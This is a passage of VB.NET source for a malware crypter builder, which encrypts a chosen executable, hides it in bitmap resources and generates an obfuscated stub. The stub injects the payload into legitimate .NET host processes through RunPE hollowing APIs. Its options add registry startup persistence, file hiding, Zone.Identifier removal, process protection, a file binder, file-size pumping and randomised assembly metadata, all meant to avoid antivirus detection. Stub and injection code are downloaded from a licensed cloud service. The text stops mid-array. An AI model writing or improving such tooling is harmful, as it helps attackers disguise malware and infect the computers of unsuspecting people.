Imports System.Text
Imports System.Threading
Imports System.Text.RegularExpressions
Imports System.IO
Imports Ionic.Zip
Imports System.Drawing.Imaging

Public Class frmMain
#Region " Declarations "
    Private NetsealONOFF = False
    Private ReadOnly msgbox_title As String = System.Windows.Forms.Application.ProductName & " | "
    Private ReadOnly randomstringpool_eng As String = "bcdefghijklmnopqrtuwxyz" '23  | 'abcdefghijklmnopqrstuvwxyz = 26 ( Full )
    Private ReadOnly folder_path As String = System.Environment.GetFolderPath(System.Environment.SpecialFolder.CommonApplicationData) & "\" & System.Windows.Forms.Application.ProductName
    Private ReadOnly Space As String = Microsoft.VisualBasic.Strings.ChrW(32)
    Private ReadOnly NewLine As String = System.Environment.NewLine
    Private ReadOnly rand As New System.Random

    Private strIconPath As String

#End Region
#Region " Assembly Info "
    Private Function CreateASM() As String
        Dim Assembly As String = My.Resources.AssemblyBase
        Assembly = Assembly.Replace("/Copy/", txtCopy.Text)
        Assembly = Assembly.Replace("/Product/", txtProduct.Text)
        Assembly = Assembly.Replace("/Desc/", txtDesc.Text)
        Assembly = Assembly.Replace("/TM/", txtTM.Text)
        Assembly = Assembly.Replace("/V1/", txtV1.Text)
        Assembly = Assembly.Replace("/V2/", txtV2.Text)
        Assembly = Assembly.Replace("/V3/", txtV3.Text)
        Assembly = Assembly.Replace("/V4/", txtV4.Text)
        Return Assembly
    End Function
#End Region
#Region " Global Variables "
    Dim seal As License = New License()
    Dim r As Random = New Random()
    Dim EOFData As String = Nothing
#End Region
#Region " Netseal "
    Sub New()
        If NetsealONOFF = True Then seal.Initialize("DC460000")

        InitializeComponent()
    End Sub
#End Region
#Region " Methods "

    Private Function ReadEOFData(ByRef FilePath As String) As String
        Dim EOFBuf As String = Nothing
        Dim lPos As Integer
        Dim ReadFile As String = IO.File.ReadAllText(FilePath)
        lPos = InStr(1, StrReverse(ReadFile), GetNullBytes(30))
        EOFBuf = (Mid(StrReverse(ReadFile), 1, lPos - 1))
        Return StrReverse(EOFBuf)
    End Function
    Public Function GetNullBytes(ByRef lNum As Object) As String
        Dim Buf As String = Nothing
        Dim i As Short
        For i = 1 To lNum
            Buf = Buf & Chr(0)
        Next
        GetNullBytes = Buf
    End Function
    Private Sub BrowseDialog(filt As String, title As String, txtbox As DivinityTextBox)
        Dim ofd As New OpenFileDialog With {.Title = title, .Filter = filt}
        ofd.ShowDialog()
        If Not ofd.FileName = Nothing Then txtbox.Text = ofd.FileName
    End Sub
    Private Sub StartupOption(val As Boolean)
        txtInstall.Enabled = val
        txtReg.Enabled = val
    End Sub
    Private Sub BindOption(val As Boolean)
        btnBind.Enabled = val
        txtBind.Enabled = val
        chkOnce.Enabled = val
    End Sub
    Private Sub AssemblyOption(val As Boolean)
        txtProduct.Enabled = val
        txtDesc.Enabled = val
        txtCopy.Enabled = val
        txtTM.Enabled = val
        txtV1.Enabled = val
        txtV2.Enabled = val
        txtV3.Enabled = val
        txtV4.Enabled = val
        btnRand.Enabled = val
        btnClone.Enabled = val
    End Sub

    Private Sub IconOption(val As Boolean)
        txtIcon.Enabled = val
        btnIco.Enabled = val
    End Sub
    Private Sub GenerateAssembly()
        txtProduct.Text = Misc.GeneratePassword(10)
        txtDesc.Text = Misc.GeneratePassword(10)
        txtCopy.Text = Misc.GeneratePassword(10)
        txtTM.Text = Misc.GeneratePassword(10)
        txtV1.Text = GenerateNumbers(1)
        txtV2.Text = GenerateNumbers(1)
        txtV3.Text = GenerateNumbers(1)
        txtV4.Text = GenerateNumbers(1)
    End Sub

    Private Function GenerateNumbers(len As Integer)
        Dim s As String = "0123456789"
        Dim sb As New StringBuilder
        For i As Integer = 1 To len
            Dim idx As Integer = r.Next(0, s.Length - 1)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
#End Region
#Region " Control Events "
    Private Sub rndPool_CharacterSelection(s As Object, c As Char) Handles rndPool.CharacterSelection
        If txtKey.Text.Contains("Encryption") Then txtKey.Text = Nothing
        If txtKey.Text.Length < 50 Then txtKey.Text &= c
    End Sub

    Private Sub chkStartup_CheckedChanged(sender As Object) Handles chkStartup.CheckedChanged
        StartupOption(chkStartup.Checked)
    End Sub
    Private Sub chkDelay_CheckedChanged(sender As Object) Handles chkDelay.CheckedChanged
        txtDelay.Enabled = chkDelay.Checked
    End Sub

    Private Sub chkSpoof_CheckedChanged(sender As Object) Handles chkSpoof.CheckedChanged
        txtExt.Enabled = chkSpoof.Checked
    End Sub

    Private Sub chkPump_CheckedChanged(sender As Object) Handles chkPump.CheckedChanged
        txtKB.Enabled = chkPump.Checked
    End Sub

    Private Sub chkBind_CheckedChanged(sender As Object) Handles chkBind.CheckedChanged
        BindOption(chkBind.Checked)
    End Sub

    Private Sub chkAsm_CheckedChanged(sender As Object) Handles chkAsm.CheckedChanged
        AssemblyOption(chkAsm.Checked)
    End Sub

    Private Sub chkIco_CheckedChanged(sender As Object) Handles chkIco.CheckedChanged
        IconOption(chkIco.Checked)
    End Sub

    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        comboInject.SelectedIndex = 0
        If NetsealONOFF = True Then txtNews.Text = seal.GlobalMessage
        If NetsealONOFF = True Then lblUser.Text = seal.Username
        If NetsealONOFF = True Then lblExpire.Text = seal.ExpirationDate

        '   Clipboard.SetText(String.Format("{0}?key={1}&user={2}&action={3}", seal.GetVariable("cres"), seal.PublicToken, seal.Username, Name))
    End Sub

    Private Sub btnRand_Click(sender As Object, e As EventArgs) Handles btnRand.Click
        GenerateAssembly()
    End Sub

    Private Sub btnIco_Click(sender As Object, e As EventArgs) Handles btnIco.Click
        BrowseDialog("Icon Files|*.ico", "Icon File", txtIcon)
    End Sub

    Private Sub btnBrowse_Click(sender As Object, e As EventArgs) Handles btnBrowse.Click
        BrowseDialog("Executable File|*.exe", "File to crypt", txtFile)
    End Sub

    Private Sub btnBind_Click(sender As Object, e As EventArgs) Handles btnBind.Click
        BrowseDialog("All Files|*.*", "File to bind", txtBind)
    End Sub

    Private Sub btnCrypt_Click(sender As Object, e As EventArgs) Handles btnCrypt.Click
        Dim savedialog As New SaveFileDialog With {.Title = "Save as...", .Filter = "Executable File|*.exe"}
        savedialog.ShowDialog()
        If Not savedialog.FileName = Nothing Then
            'Dim t As Thread = New Thread(Sub() Compile(savedialog.FileName))
            't.Name = "Compiler"
            't.Start()
            btnCrypt.Text = "Crypting..."
            btnCrypt.Enabled = False
            Compile(savedialog.FileName)
            btnCrypt.Text = "Encrypt My File(s)"
            btnCrypt.Enabled = True
        End If
    End Sub
    Private Sub btnProfile_Click(sender As Object, e As EventArgs) Handles btnProfile.Click
        If NetsealONOFF = True Then seal.ShowAccount()
    End Sub
#End Region
#Region " Compiler "

    Public Function getCloudResource(ByVal name As String, ByVal asString As Boolean) As Object

        Try
            Dim data As Byte() = seal.Decrypt(seal.Client.DownloadData(String.Format("{0}?key={1}&user={2}&action={3}", seal.GetVariable("cres"), seal.PublicToken, seal.Username, name)))
            If asString Then
                Return Encoding.ASCII.GetString(data)
            Else
                Return Convert.FromBase64String(Encoding.ASCII.GetString(data))
            End If
        Catch ex As Exception
            MessageBox.Show("Error while fetching the cloud resource!" & vbCrLf & ex.ToString, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return ""
        End Try
    End Function
    Private Sub ConstructStub(filename As String)

        Dim stub As String = CStr(getCloudResource("stub", True))
        Dim runpe As Byte() = getCloudResource("runpe", False)
        If stub.Length = 0 Then
            Return
        End If
        If chkStartup.Checked Then
            stub = stub.Replace("'/Startup/", Nothing)
            stub = stub.Replace("/Filename/", txtInstall.Text)
            stub = stub.Replace("/Key/", txtKey.Text)
        End If

        If chkMelt.Checked Then
            stub = stub.Replace("'/Melt/", Nothing)
        End If

        If chkDelay.Checked Then
            stub = stub.Replace("'/Delay/", Nothing)
            stub = stub.Replace("/Time/", txtDelay.Text)
        End If

        If chkBind.Checked Then
            stub = stub.Replace("'/Bind/", Nothing)
            Dim extension As String = IO.Path.GetExtension(txtBind.Text)
            stub = stub.Replace("/Ext/", extension)
            If chkOnce.Checked Then
                stub = stub.Replace("'/Runonce/", Nothing)
            End If
        End If

        If chkPersist.Checked Then
            stub = stub.Replace("'/Protect/", Nothing)
        End If

        If chkAsm.Checked Then
            stub = stub.Replace("'/Asm/", CreateASM())
        End If
        Me.Invoke(Sub()
                      Select Case comboInject.SelectedIndex
                          Case 0
                              stub = stub.Replace(Chr(34) & "/Inject/" & Chr(34), "System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName")
                          Case 1
                              stub = stub.Replace(Chr(34) & "/Inject/" & Chr(34), "Environment.SystemDirectory.Replace(""system32"", ""Microsoft.NET\Framework\v2.0.50727\AppLaunch.exe"")")
                          Case 2
                              stub = stub.Replace(Chr(34) & "/Inject/" & Chr(34), "Environment.SystemDirectory.Replace(""system32"", ""Microsoft.NET\Framework\v2.0.50727\vbc.exe"")")
                          Case 3
                              stub = stub.Replace(Chr(34) & "/Inject/" & Chr(34), "Environment.SystemDirectory.Replace(""system32"", ""Microsoft.NET\Framework\v2.0.50727\cvtres.exe"")")
                          Case 4
                              stub = stub.Replace(Chr(34) & "/Inject/" & Chr(34), "Environment.SystemDirectory & ""\"" & ""calc.exe""")
                      End Select
                  End Sub)

        stub = stub.Replace("/Key/", txtKey.Text)
        ' stub = stub.Replace("'/APIS/", GenerateAPIs.Gen(25))
        If chkIco.Checked Then compileStructure.iconFile = txtIcon.Text
        If chkBind.Checked Then compileStructure.bindFile = txtBind.Text
        If chkSpoof.Checked Then compileStructure.spoof = txtExt.Text
        compileStructure.exeFile = txtFile.Text
        compileStructure.EOF.useEOF = False
        compileStructure.encryptionKey = txtKey.Text
        stub = Protect.Obfuscate(stub)
        Compiler.InitalizeCompile(stub, filename, runpe)
        If chkPump.Checked Then
            Dim filesize As Integer = Convert.ToInt32(txtKB.Text) * 1024
            Dim filetopump = IO.File.OpenWrite(filename)
            Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
            While size < filesize
                filetopump.WriteByte(0)
                size += 1
            End While
        End If
        If chkEOF.Checked Then
            IO.File.WriteAllText(filename, EOFData)
        End If
        Me.Invoke(Sub()
                      btnCrypt.Text = "Encrypt My File(s)"
                      btnCrypt.Enabled = True
                  End Sub)
    End Sub
    Private Function rndval(ByVal length As Integer, ByVal pool As String) As String
        Dim p As New System.Text.StringBuilder("")
        Dim b() As Char = pool.ToCharArray()
        For x As Integer = 1 To length
            Microsoft.VisualBasic.VBMath.Randomize()
            p.Append(b(CInt(Microsoft.VisualBasic.Conversion.Int(((b.Length - 2) - 0 + 1) * Microsoft.VisualBasic.VBMath.Rnd()) + 1)))
        Next
        Return p.ToString()
    End Function
    Private Sub Compile(ByVal sfd As String)
        Try

            If chkSpoof.Checked Then sfd = txtExt.Text

            '---------- Create Folder ----------'
            If Not System.IO.Directory.Exists(folder_path) Then
                System.IO.Directory.CreateDirectory(folder_path)
            End If
            '-----------------------------------'
ReTryBuild:

            '-------- Core Declarations --------'
            Dim global_usg_base As String = rndval(rand.Next(3, 6), randomstringpool_eng)

            Dim stub_usg_base As String = global_usg_base
            Dim stub_usg_randomint As Integer = rand.Next(3, 6)

            Dim dll_usg_base As String = global_usg_base
            Dim dll_usg_randomint As Integer = rand.Next(3, 6)

            Dim resource_usg_base As String = global_usg_base
            Dim resource_usg_randomint As Integer = rand.Next(3, 6)

            Dim stub_rotUpDown As Integer = rand.Next(2, 65411)
            Dim dll_rotUpDown As Integer = rand.Next(2, 65411)
            'CharCode is supposed to be at a maximum of 65535, but that does not work, 65411 does though. Negative values were messing up.

            Dim Dll_Path As String = folder_path & "\" & rndval(rand.Next(5, 7), randomstringpool_eng) & ".dll"
            Dim StubRes As String
            If NetsealONOFF = True Then
                StubRes = getCloudResource("StubRes", True)
            Else
                StubRes = "" 'My.Resources.txt_Stub
            End If
            Dim DllRes As String
            If NetsealONOFF = True Then
                DllRes = getCloudResource("DllRes", True)
            Else
                DllRes = "" 'My.Resources.txt_Dll
            End If
            'Dim invoke_method As String = "System.Reflection.Assembly.Load"
            Dim invoke_method As String = "System.AppDomain.CurrentDomain.Load"

            Dim stub_decryptString As String = "DeRotate"
            Dim stub_decryptByte As String = "DeCrypt"

            Dim dll_decryptString As String = "clsDEROTATE.funcDEROTATE"

            Dim runpe_string As String = dll_usg_base & rndval(dll_usg_randomint, randomstringpool_eng)
            Dim runpe_stringSUB As String = dll_usg_base & rndval(dll_usg_randomint, randomstringpool_eng)

            Dim startup_string As String = dll_usg_base & rndval(dll_usg_randomint, randomstringpool_eng)
            Dim startup_stringMAIN As String = dll_usg_base & rndval(dll_usg_randomint, randomstringpool_eng)

            Dim DynamicRN_MainBytes_1 As String = resource_usg_base & rndval(resource_usg_randomint, randomstringpool_eng)
            Dim DynamicRN_MainBytes_2 As String = resource_usg_base & rndval(resource_usg_randomint, randomstringpool_eng)

            Dim DynamicRN_DllBytes_1 As String = resource_usg_base & rndval(resource_usg_randomint, randomstringpool_eng)
            Dim DynamicRN_DllBytes_2 As String = resource_usg_base & rndval(resource_usg_randomint, randomstringpool_eng)

            Dim main_cls As String = dll_usg_base & rndval(dll_usg_randomint, randomstringpool_eng)
            DllRes = DllRes.Replace("clsALL", main_cls)

            Dim main_sub As String = dll_usg_base & rndval(dll_usg_randomint, randomstringpool_eng)
            DllRes = DllRes.Replace("subALL", main_sub)
            '-----------------------------------'

            '----- Main Byte Declarations ------'
            Dim Main_Enc_Key As String = rndval(rand.Next(3, 6), randomstringpool_eng)
            Dim Main_Enc_Data As Byte() = System.IO.File.ReadAllBytes(txtFile.Text)
            Dim Main_Enc_Bytes As Bitmap = CreateBitmapFromData(Crypt(Main_Enc_Data, Main_Enc_Key))
            'Dim Main_Enc_Bytes As String = Encoding.UTF8.GetString(Crypt(Main_Enc_Data, Main_Enc_Key))
            Dim stub_mainvar As String = stub_decryptByte & "(" & CreateStubRes(DynamicRN_MainBytes_1, DynamicRN_MainBytes_2) & "), """ & Main_Enc_Key & """)"
            '-----------------------------------'

            '----------- Dll Features ----------'

            Dim delzoneidfunc As String =
                "<System.Runtime.InteropServices.DllImport(""kernel32"", CharSet:=System.Runtime.InteropServices.CharSet.Unicode, SetLastError:=True)> _" & NewLine & _
                "Public Shared Function DeleteFile(DEL_ZONEID_VAR_001 As String) As <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)> Boolean" & NewLine & _
                "End Function"
            DllRes = DllRes.Replace("'%DeleteZoneID_Func%", delzoneidfunc)
            DllRes = DllRes.Replace("'%DeleteZoneID_Call%", "DeleteFile(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName + "":Zone.Identifier"")")




            Select Case comboInject.SelectedIndex 'Custom Injection
                Case 0 'It Self
                    DllRes = DllRes.Replace("""%Injection_Path%""", "System.Diagnostics.Process.GetCurrentProcess.MainModule.FileName")
                Case 3 'cvtres
                    DllRes = DllRes.Replace("%Injection_Path%", "\Windows\Microsoft.NET\Framework\v2.0.50727\cvtres.exe")
                Case 1 'AppLaunch
                    DllRes = DllRes.Replace("%Injection_Path%", "\Windows\Microsoft.NET\Framework\v2.0.50727\AppLaunch.exe")
                Case 2 'vbc
                    DllRes = DllRes.Replace("%Injection_Path%", "\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe")
                Case 4 'calc
                    DllRes = DllRes.Replace("%Injection_Path%", "\Windows\System32\calc.exe")
                Case 5 'RegAsm
                    DllRes = DllRes.Replace("%Injection_Path%", "\Windows\Microsoft.NET\Framework\v2.0.50727\RegAsm.exe")
            End Select

            If chkPersist.Checked Then 'Process Protection
                
                DllRes = DllRes.Replace("'%Process_Protection%", String.Empty)
            End If

            If chkMelt.Checked Then 'Hidden File
                DllRes = DllRes.Replace("'%Hide_File%", "System.IO.File.SetAttributes(System.Windows.Forms.Application.ExecutablePath, System.IO.FileAttributes.Hidden)")
            End If

            If chkDelay.Checked Then 'Delay Execution
                DllRes = DllRes.Replace("'%Delay%", "System.Threading.Thread.Sleep(" & txtDelay.Text * 1000 & ")")
            End If

            If chkStartup.Checked Then
                DllRes = DllRes.Replace("%registrykey%", txtReg.Text)
                DllRes = DllRes.Replace("%filename%", txtInstall.Text)

                DllRes = DllRes.Replace("""%folderpath%""", "System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData)")
                DllRes = DllRes.Replace("& ""\"" & ""%foldername%""", String.Empty)
                DllRes = DllRes.Replace("'%Startup%", String.Empty)
            End If



            '-----------------------------------'

            '------------- Dll USG -------------'
            DllRes = DllRes.Replace("(strinput, derot1, 1)) - 420)", "(strinput, derot1, 1)) - " & dll_rotUpDown & ")")
            DllRes = DllRes.Replace("""\Windows\Microsoft.NET\Framework\v2.0.50727\cvtres.exe""", dll_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("\Windows\Microsoft.NET\Framework\v2.0.50727\cvtres.exe", dll_rotUpDown) & """)") 'Injection Path
            DllRes = DllRes.Replace("""\Windows\Microsoft.NET\Framework\v2.0.50727\AppLaunch.exe""", dll_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("\Windows\Microsoft.NET\Framework\v2.0.50727\AppLaunch.exe", dll_rotUpDown) & """)") 'Injection Path
            DllRes = DllRes.Replace("""\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe""", dll_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe", dll_rotUpDown) & """)") 'Injection Path
            DllRes = DllRes.Replace("""\Windows\System32\cmd.exe""", dll_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("\Windows\System32\cmd.exe", dll_rotUpDown) & """)") 'Injection Path

            DllRes = DllRes.Replace("""Error!""", dll_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("Error!", dll_rotUpDown) & """)")
            DllRes = DllRes.Replace(""" | Error!""", dll_decryptString & "(""" & clsRotation_String.Rotation_Encrypt(" | Error!", dll_rotUpDown) & """)")

            DllRes = RenameAll(dll_usg_base, dll_usg_randomint, "ByVal ", " ", DllRes)
            DllRes = RenameAll(dll_usg_base, dll_usg_randomint, "ByRef ", " ", DllRes)

            Dim Dll_USG_Var_RunPE_APIS As String() = {"CreateProcess_API", _
                                                      "Wow64GetThreadContext_API", "Wow64SetThreadContext_API", _
                                                      "GetThreadContext_API", "SetThreadContext_API", _
                                                      "ReadProcessMemory_API", "WriteProcessMemory_API", _
                                                      "NtUnmapViewOfSection_API", _
                                                      "VirtualAllocEx_API", _
                                                      "ResumeThread_API", _
                                                      "PROCESS_INFORMATION", "STARTUP_INFORMATION"}
            DllRes = RenameSpecific(dll_usg_base, dll_usg_randomint, Dll_USG_Var_RunPE_APIS, DllRes)
            Dim Dll_USG_Var_RunPE_VARS As String() = {"ProcessHandle", "ThreadHandle", "ProcessId", "ThreadId", _
                                                         "Size_", "Reserved1", "Desktop", "Title", _
                                                         "dwXCountChars", "dwYCountChars", "dwFillAttribute", "dwFlags", _
                                                         "dwX", "dwY", "dwXSize", "dwYSize", _
                                                         "wShowWindow", "cbReserved2", "Reserved2", _
                                                         "StdInput", "StdOutput", "StdError", _
                                                            "injRun", "irni", _
                                                               "HandleRun", "ReadWrite", "QuotedPath", "SI", "PI",
                                                               "FileAddress", "Context_", "Ebx", _
                                                               "BaseAddress", "SizeOfImage", "SizeOfHeaders", "AllowOverride", _
                                                               "SectionOffset", "NumberOfSections", _
                                                               "VirtualAddress", "SizeOfRawData", "PointerToRawData", "SectionData", _
                                                               "PointerData", "AddressOfEntryPoint", "Pros", _
                                                               "NewImageBase", "ImageBase", _
                                                      "fri"}
            DllRes = RenameSpecific(dll_usg_base, dll_usg_randomint, Dll_USG_Var_RunPE_VARS, DllRes)

            Dim Dll_USG_Vars As String() = {"ReadDataFromBitmap", "clsDEROTATE", "funcDEROTATE", _
                                            "strinput", "derot1", _
                                              "Inj_HandleRun", "Inj_Run", _
                                             "clsPROT", _
                                             "PROT_VAR_001", "PROT_VAR_002", "PROT_VAR_003", "PROT_VAR_004", "PROT_VAR_005", "PROT_VAR_006", "PROT_VAR_007", "PROT_VAR_008", "PROT_VAR_009", "PROT_VAR_010", "PROT_VAR_011", _
                                             "PROT_VAR_012", "PROT_VAR_013", "PROT_VAR_014", "PROT_VAR_015", "PROT_VAR_016", "PROT_VAR_017", "PROT_VAR_018", "PROT_VAR_019", "PROT_VAR_020", "PROT_VAR_021", "PROT_VAR_022", _
                                            "GetProcessSecurityDescriptor", "InlineAssignHelper", "ProtectOtherProcess", "ProtectProcess", "SetProcessSecurityDescriptor", _
                                            "DEL_ZONEID_VAR_001", _
                                            "ANTI_SB_VAR_001", _
                                            "clsRUNPE", _
                                            "EXCPTN", "InjectionData"}

            '-----------------------------------'

            DllRes = RenameSpecific(dll_usg_base, dll_usg_randomint, Dll_USG_Vars, DllRes)

            '----------- Compile Dll -----------'
            CompileDll(DllRes, Dll_Path)

            If Not System.IO.File.Exists(Dll_Path) Then
                CleanUpBuild()
                GoTo ReTryBuild
                'If System.Windows.Forms.MessageBox.Show("There was an error compiling, would you like to re-try? - Compiling Dll (X001) ", msgbox_title & "Compiling Error!", System.Windows.Forms.MessageBoxButtons.YesNo, System.Windows.Forms.MessageBoxIcon.Error) = System.Windows.Forms.DialogResult.Yes Then
                'End If
            End If
            '-----------------------------------'

            '------ Dll Byte Declarations ------'
            Dim Dll_Enc_Key As String = rndval(rand.Next(3, 6), randomstringpool_eng)
            Dim Dll_Enc_Data As Byte() = System.IO.File.ReadAllBytes(Dll_Path)
            Dim Dll_Enc_Bytes As Bitmap = CreateBitmapFromData(Crypt(Dll_Enc_Data, Dll_Enc_Key))
            'Dim Dll_Enc_Bytes As String = Encoding.UTF8.GetString(Crypt(Dll_Enc_Data, Dll_Enc_Key))

            Dim stub_dllvar As String = stub_decryptByte & "(" & CreateStubRes(DynamicRN_DllBytes_1, DynamicRN_DllBytes_2) & "), """ & Dll_Enc_Key & """)"

            'StubRes = StubRes.Replace("'%Everything%", "Dim dzdzdz = " & invoke_method & "(" & stub_dllvar & ")" & vbCrLf _
            '    & "Dim jkdzjkdjzk = dzdzdz.GetTypes(""0"")" & vbCrLf & _
            '     "Dim wwww = jkdzjkdjzk.GetMethod(""" & main_sub & """).Invoke(Nothing, New Object() {" & stub_mainvar & "})")

            StubRes = StubRes.Replace("%invokemtd%", invoke_method)
            StubRes = StubRes.Replace("%stubdllvar%", stub_dllvar)
            StubRes = StubRes.Replace("%mainsub%", main_sub)
            StubRes = StubRes.Replace("%stubmainvar%", stub_mainvar)
            'StubRes = StubRes.Replace("'%Everything%", invoke_method & "(" & stub_dllvar & ").GetType(""" & main_cls & """).GetMethod(""" & main_sub & """).Invoke(Nothing, New Object() {" & stub_mainvar & "})")
            '-----------------------------------'


            'write le call ici je transformerais
            '



            '------------ Assembly -------------'
            Dim assembly_tf As String = "True"
            Dim assembly_all As String = _
                "<Assembly: System.Reflection.AssemblyTitle(" & Chr(34) & txtProduct.Text & Chr(34) & ")>" & NewLine & _
                "<Assembly: System.Reflection.AssemblyDescription(" & Chr(34) & txtDesc.Text & Chr(34) & ")>" & NewLine & _
                "<Assembly: System.Reflection.AssemblyCompany(" & Chr(34) & txtDesc.Text & Chr(34) & ")>" & NewLine & _
                "<Assembly: System.Reflection.AssemblyProduct(" & Chr(34) & txtProduct.Text & Chr(34) & ")>" & NewLine & _
                "<Assembly: System.Reflection.AssemblyCopyright(" & Chr(34) & txtCopy.Text & Chr(34) & ")>" & NewLine & _
                "<Assembly: System.Reflection.AssemblyTrademark(" & Chr(34) & txtCopy.Text & Chr(34) & ")>" & NewLine & _
                "<Assembly: System.Runtime.InteropServices.ComVisible(" & assembly_tf & ")>" & NewLine & _
                "<Assembly: System.Runtime.InteropServices.GuidAttribute(""" & System.Guid.NewGuid().ToString & """)>" & NewLine & _
                "<Assembly: System.Reflection.AssemblyVersion(""" & txtV1.Text & "." & txtV2.Text & "." & txtV3.Text & "." & txtV4.Text & """)>" & NewLine & _
                "<Assembly: System.Reflection.AssemblyFileVersion(""" & txtV1.Text & "." & txtV2.Text & "." & txtV3.Text & "." & txtV4.Text & """)>" & NewLine & _
                "<Assembly: System.Runtime.CompilerServices.CompilationRelaxations(" & rand.Next(50, 5000) & ")>" & NewLine & _
                "<Assembly: System.Runtime.CompilerServices.RuntimeCompatibility(WrapNonExceptionThrows:=" & assembly_tf & ")>" & NewLine & _
                "<Assembly: System.Resources.SatelliteContractVersion(""" & rand.Next(0, 9999) & "." & rand.Next(0, 9999) & "." & rand.Next(0, 9999) & "." & rand.Next(0, 9999) & """)>" & NewLine & _
                "<Assembly: System.Runtime.CompilerServices.DefaultDependency(System.Runtime.CompilerServices.LoadHint.Always)>" & NewLine & _
                "<Assembly: System.Runtime.CompilerServices.StringFreezing()>" & NewLine & _
                "<Assembly: System.Runtime.InteropServices.ComCompatibleVersion(" & rand.Next(0, 10000) & ", " & rand.Next(0, 10000) & ", " & rand.Next(0, 10000) & ", " & rand.Next(0, 10000) & ")>" & NewLine & _
                "<Assembly: System.Runtime.InteropServices.TypeLibVersion(" & rand.Next(0, 10000) & ", " & rand.Next(0, 10000) & ")>"

            StubRes = StubRes.Replace("'%Assembly%", assembly_all)
            '-----------------------------------'

            '------------- Binder --------------'
            Dim DynamicRN_BinderBytes_1 As String = resource_usg_base & rndval(resource_usg_randomint, randomstringpool_eng)
            Dim DynamicRN_BinderBytes_2 As String = resource_usg_base & rndval(resource_usg_randomint, randomstringpool_eng)
            If txtBind.Text <> String.Empty Then
                Dim filename As String = clsRotation_String.Rotation_Encrypt(System.IO.Path.GetFileName(txtBind.Text), stub_rotUpDown)
                Dim binder As String = _
                    "If Not System.IO.File.Exists(System.IO.Path.GetTempPath & " & stub_decryptString & "(""" & filename & """)) Then" & NewLine & _
                    "System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath & " & stub_decryptString & "(""" & filename & """), (" & CreateStubRes(DynamicRN_BinderBytes_1, DynamicRN_BinderBytes_2) & ")))" & NewLine & _
                    "System.Diagnostics.Process.Start(System.IO.Path.GetTempPath & " & stub_decryptString & "(""" & filename & """))" & NewLine & _
                    "End If"
                StubRes = StubRes.Replace("'%Binder%", binder)
                GenerateResource(folder_path & "\" & DynamicRN_BinderBytes_1 & ".resources", DynamicRN_BinderBytes_2, Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(txtBind.Text)))
            End If
            '-----------------------------------'


            '------------ Stub USG -------------'
            StubRes = StubRes.Replace("(strInput, x_drt, 1)) - 420)", "(strInput, x_drt, 1)) - " & stub_rotUpDown & ")")

            StubRes = StubRes.Replace("""Error!""", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("Error!", stub_rotUpDown) & """)")
            StubRes = StubRes.Replace(""" | Error!""", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt(" | Error!", stub_rotUpDown) & """)")

            'main_cls is only needed if i am not going to be going .gettypes for invoking the dll and getting the class, and if I am not doing that then ...
            'StubRes = StubRes.Replace("""" & main_cls & """", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & main_cls & "", stub_rotUpDown) & """)")
            '... this will not be required
            StubRes = StubRes.Replace("""0""", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("0", stub_rotUpDown) & """)")

            StubRes = StubRes.Replace("""" & main_sub & """", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & main_sub & "", stub_rotUpDown) & """)")
            StubRes = StubRes.Replace("(""" & runpe_string & """)", "(" & stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & runpe_string & "", stub_rotUpDown) & """))") 'RunPE
            StubRes = StubRes.Replace("(""" & runpe_stringSUB & """)", "(" & stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & runpe_stringSUB & "", stub_rotUpDown) & """))") 'RunPE

            StubRes = StubRes.Replace("""" & DynamicRN_MainBytes_1 & """", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & DynamicRN_MainBytes_1 & "", stub_rotUpDown) & """)") 'Resources
            StubRes = StubRes.Replace("""" & DynamicRN_MainBytes_2 & """", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & DynamicRN_MainBytes_2 & "", stub_rotUpDown) & """)") 'Resources
            StubRes = StubRes.Replace("""" & DynamicRN_DllBytes_1 & """", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & DynamicRN_DllBytes_1 & "", stub_rotUpDown) & """)") 'Resources
            StubRes = StubRes.Replace("""" & DynamicRN_DllBytes_2 & """", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & DynamicRN_DllBytes_2 & "", stub_rotUpDown) & """)") 'Resources
            StubRes = StubRes.Replace("""" & DynamicRN_BinderBytes_1 & """", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & DynamicRN_BinderBytes_1 & "", stub_rotUpDown) & """)") 'Resources
            StubRes = StubRes.Replace("""" & DynamicRN_BinderBytes_2 & """", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & DynamicRN_BinderBytes_2 & "", stub_rotUpDown) & """)") 'Resources

            StubRes = StubRes.Replace("""" & Main_Enc_Key & """", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & Main_Enc_Key & "", stub_rotUpDown) & """)") 'Stub Decryption Key
            StubRes = StubRes.Replace("""" & Dll_Enc_Key & """", stub_decryptString & "(""" & clsRotation_String.Rotation_Encrypt("" & Dll_Enc_Key & "", stub_rotUpDown) & """)") 'Stub Decryption Key

            Dim Stub_USG_Vars As String() = {"ReadDataFromBitmap", "Stub_Module", _
                                             "rndnmspc", "JunkForm1", _
                                             "components", _
